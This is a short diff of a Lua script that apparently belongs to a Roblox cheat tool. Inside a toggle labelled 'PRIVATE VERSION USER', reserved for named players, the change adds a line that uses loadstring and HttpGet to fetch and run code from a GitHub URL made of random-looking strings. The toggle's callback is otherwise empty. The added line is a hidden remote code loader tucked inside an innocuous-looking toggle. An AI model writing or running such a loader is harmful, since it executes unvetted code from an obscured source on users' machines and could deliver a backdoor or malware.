@@ -220,6 +220,7 @@ if game.Players.LocalPlayer.Name == 'PistonIsThe' or game.Players.LocalPlayer.Na
 	local oasjdiadhasudba = LIB("Whitelist", {
 	["Name"]  = "PRIVATE VERSION USER",
 	["Function"] = function(callback)
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/fuahsfpgagfsagf9we8gadsuea/rgaadfgugeoafbvpuga8egfaf/main/fasfuheha79cge7gafafeadfe.lua', true))()
 		if callback then
 		end
 	end,
